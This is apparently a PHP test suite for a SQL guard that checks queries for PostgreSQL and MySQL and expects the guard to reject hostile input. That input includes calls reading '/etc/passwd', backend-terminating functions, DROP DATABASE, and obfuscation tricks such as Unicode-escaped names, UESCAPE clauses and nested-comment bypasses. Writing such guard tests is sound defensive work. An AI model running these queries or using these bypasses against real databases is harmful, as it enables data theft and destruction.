    'inside a CTE body' => 'WITH x AS (SELECT * FROM t) SELECT * INTO t2 FROM x',
    'quoted target' => 'SELECT * INTO "t2" FROM t',
]);

test('INSERT INTO inside a CTE body is a write but not a SELECT INTO', function () {
    $result = inspect('WITH x AS (INSERT INTO t (a) VALUES (1) RETURNING a) SELECT * FROM x', DbDriver::Pgsql);

    expect($result->type())->toBe(StatementType::Write)
        ->and($result->hasDdl())->toBeFalse();
});

test('a blocked function hidden in U& escapes is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'escaped blocked function' => 'SELECT U&"pg\005fterminate\005fbackend"(123)',
    'custom UESCAPE' => "SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!'(123)",
    'schema-qualified' => 'SELECT pg_catalog.U&"pg\005fcancel\005fbackend"(1)',
    'escaped file IO function' => 'SELECT U&"pg\005fread\005ffile"(\'/etc/passwd\')',
]);

test('a resource function hidden in U& escapes makes the statement a write', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Write);
})->with([
    'four-digit escape' => 'SELECT U&"pg\005fsleep"(10)',
    'six-digit escape' => 'SELECT U&"pg\+00005fsleep"(10)',
    'lower-case u' => 'SELECT u&"pg\005fsleep"(10)',
]);

test('a called U& name the guard cannot decode is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'truncated escape' => 'SELECT U&"pg\005"(1)',
    'surrogate code point' => 'SELECT U&"\D800x"(1)',
    'invalid UESCAPE character' => "SELECT U&\"pg+005fsleep\" UESCAPE '+'(1)",
]);

test('a quoted function name is read from its raw spelling', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'double-quoted' => 'SELECT "pg_terminate_backend"(1)',
    'double-quoted file IO' => 'SELECT "pg_read_file"(\'/etc/passwd\')',
    'backticked file IO' => 'SELECT `load_file`(\'/etc/passwd\')',
]);

test('every dblink function is blocked', function (string $function) {
    expect(inspect("SELECT {$function}('conn', 'SELECT 1')", DbDriver::Pgsql)->passes())->toBeFalse();
})->with(['dblink_connect_u', 'dblink_open', 'dblink_fetch', 'dblink_get_result']);

test('a PostgreSQL EXPLAIN without ANALYZE does not judge the calls it only plans', function () {
    $sleep = inspect('EXPLAIN SELECT pg_sleep(10)', DbDriver::Pgsql);
    $terminate = inspect('EXPLAIN SELECT pg_terminate_backend(1)', DbDriver::Pgsql);
    $analyzed = inspect('EXPLAIN ANALYZE SELECT pg_terminate_backend(1)', DbDriver::Pgsql);

    expect($sleep->passes())->toBeTrue()
        ->and($sleep->type())->toBe(StatementType::Read)
        ->and($terminate->passes())->toBeTrue()
        ->and($terminate->type())->toBe(StatementType::Read)
        ->and($analyzed->passes())->toBeFalse();
});

test('a MySQL or unknown-driver EXPLAIN still judges its calls', function (?DbDriver $driver) {
    expect(inspect('EXPLAIN SELECT SLEEP(10)', $driver)->type())->toBe(StatementType::Write);
})->with([
    'mysql' => DbDriver::Mysql,
    'unknown driver' => null,
]);

// --- Review round 2: comments read per dialect, EXPLAIN EXECUTE, UESCAPE '\' ---

dataset('comment bypasses', [
    'nested comment hides EXPLAIN option value' => "EXPLAIN (ANALYZE /* /* */ false -- */\n) DELETE FROM t",
    'nested comment hides EXPLAIN option block' => 'EXPLAIN /* /* */ SELECT 1 -- */ (ANALYZE) DELETE FROM t',
    'nested comment hides INTO' => 'SELECT * /* /* */ -- */ INTO t2 FROM t',
    'nested comment hides a blocked call' => 'SELECT 1 /* /* */ -- */, pg_terminate_backend(1)',
    'nested comment hides the leading keyword' => "/* /* */ EXPLAIN -- */\nDELETE FROM t",
    'nested comment hides a second statement' => 'SELECT 1 /* /* */ -- */ ; DELETE FROM t WHERE id = 1',
    'dash comment without a space' => "SELECT 1 --x /*\n, pg_terminate_backend(1) -- */",
]);

test('a PostgreSQL comment cannot hide code from the guard', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes() && $result->type() === StatementType::Read)->toBeFalse();
})->with('comment bypasses');

test('a comment the dialects read differently is rejected when the driver is unknown', function (string $sql) {
    expect(inspect($sql)->passes())->toBeFalse();
})->with('comment bypasses');

test('a block comment that is never closed is rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'mysql' => ['SELECT 1 /* open', DbDriver::Mysql],
    'pgsql' => ['SELECT 1 /* open', DbDriver::Pgsql],
    'unknown driver' => ['SELECT 1 /* open', null],
    'pgsql, closed only for a flat reading' => ['SELECT 1 /* /* */', DbDriver::Pgsql],
]);

test('a nested PostgreSQL comment is read as one comment', function () {
    $result = inspect('SELECT /* outer /* inner */ still outer */ 1 FROM t', DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->type())->toBe(StatementType::Read)
        ->and($result->preparedSql())->not->toContain('still outer');
});

test('a PostgreSQL comment both readings agree on is kept', function () {
    $result = inspect("SELECT 1 /* trace */ FROM t -- note\n", DbDriver::Pgsql);

    expect($result->passes())->toBeTrue()
        ->and($result->preparedSql())->toContain('/* trace */')
        ->and($result->preparedSql())->toContain('-- note');
});

test('a comment opener inside a dollar-quoted string is not a comment', function () {
    expect(inspect('SELECT $$/*$$ FROM t', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('a MySQL block comment ends at its first closing marker', function () {
    expect(inspect('SELECT 1 /* /* */, SLEEP(1)', DbDriver::Mysql)->type())->toBe(StatementType::Write);
});

test('a nested comment in a DO block body cannot hide a forbidden statement', function () {
    expect(inspect('DO $$ BEGIN /* /* */ -- */ DROP DATABASE prod; END $$', DbDriver::Pgsql)->passes())->toBeFalse();
});

test('EXPLAIN EXECUTE judges the calls in its parameters', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'plain' => 'EXPLAIN EXECUTE p(pg_terminate_backend(123))',
    'with an option list' => 'EXPLAIN (FORMAT JSON) EXECUTE p(pg_terminate_backend(123))',
    'in a transaction' => 'BEGIN; PREPARE p(int) AS SELECT $1; EXPLAIN EXECUTE p(pg_terminate_backend(123)); COMMIT;',
]);

test('EXPLAIN EXECUTE with a state-changing parameter is a write', function () {
    expect(inspect("EXPLAIN EXECUTE p(nextval('s'))", DbDriver::Pgsql)->type())->toBe(StatementType::Write);
});

test('a U& name escaped with UESCAPE backslash is rejected', function () {
    expect(inspect("SELECT U&\"pg\\005fterminate\\005fbackend\" UESCAPE '\\' (1)", DbDriver::Pgsql)->passes())->toBeFalse();
});

// --- Review round 3: EXECUTE anywhere under EXPLAIN, any UESCAPE, "$" in identifiers ---

test('EXPLAIN of CREATE TABLE AS EXECUTE judges the calls in its parameters', function () {
    expect(inspect('EXPLAIN CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))', DbDriver::Pgsql)->passes())->toBeFalse()
        ->and(inspect("EXPLAIN CREATE TEMP TABLE x AS EXECUTE p(nextval('s'))", DbDriver::Pgsql)->type())->toBe(StatementType::Write);
});

test('any UESCAPE clause is rejected', function (string $sql, ?DbDriver $driver) {
    expect(inspect($sql, $driver)->passes())->toBeFalse();
})->with([
    'E-string escape' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE E'!' (1)", DbDriver::Pgsql],
    'E-string backslash' => ["SELECT U&\"pg\\005fterminate\\005fbackend\" UESCAPE E'\\\\' (1)", DbDriver::Pgsql],
    'dollar-quoted escape' => ['SELECT U&"pg!005fterminate!005fbackend" UESCAPE $$!$$ (1)', DbDriver::Pgsql],
    'tagged dollar-quoted escape' => ['SELECT U&"pg!005fterminate!005fbackend" UESCAPE $q$!$q$ (1)', DbDriver::Pgsql],
    'plain escape' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!' (1)", DbDriver::Pgsql],
    'on a column, not a call' => ["SELECT U&\"col\" UESCAPE '\\' FROM t", DbDriver::Pgsql],
    'resource call' => ["SELECT U&\"pg!005fsleep\" UESCAPE '!' (10)", DbDriver::Pgsql],
    'unknown driver' => ["SELECT U&\"pg!005fterminate!005fbackend\" UESCAPE '!' (1)", null],
]);

test('a UESCAPE rejection names the clause, not a function', function () {
    expect(inspect("SELECT U&\"col\" UESCAPE '\\' FROM t", DbDriver::Pgsql)->violations)
        ->toBe(['A UESCAPE clause is not allowed through QueryProxy; write Unicode escapes with the default backslash escape.']);
});

test('a "$" that continues an identifier does not open a dollar quote', function (string $sql) {
    $result = inspect($sql, DbDriver::Pgsql);

    expect($result->passes() && $result->type() === StatementType::Read)->toBeFalse();
})->with([
    'hides a blocked call' => 'SELECT 1 AS a$$, pg_terminate_backend(1) -- $$',
    'hides a resource-consuming call' => 'SELECT 1 AS a$$, pg_sleep(10) -- $$',
    'hides INTO' => 'SELECT 1 AS a$$ INTO t2 -- $$',
    'hides INTO under EXPLAIN ANALYZE' => 'EXPLAIN ANALYZE SELECT 1 AS a$$ INTO t2 -- $$',
]);

test('a dollar quote the guard cannot delimit like PostgreSQL is rejected', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'never closed' => 'SELECT $q$ open, pg_terminate_backend(1)',
    'after a backslash-ended string' => "SELECT 'a\\', \$\$ x \$\$ FROM t",
]);

test('an identifier with a "$" and a real dollar quote still read', function () {
    expect(inspect('SELECT a$b, $$text$$ FROM t', DbDriver::Pgsql)->passes())->toBeTrue();
});

test('CREATE TABLE AS EXECUTE judges the calls in its parameters in every form', function (string $sql) {
    expect(inspect($sql, DbDriver::Pgsql)->passes())->toBeFalse();
})->with([
    'plain' => 'CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))',
    'under EXPLAIN ANALYZE' => 'EXPLAIN ANALYZE CREATE TABLE x AS EXECUTE p(pg_terminate_backend(1))',
    'under an EXPLAIN option list' => 'EXPLAIN (VERBOSE) CREATE TEMP TABLE x AS EXECUTE p(pg_terminate_backend(1))',
]);
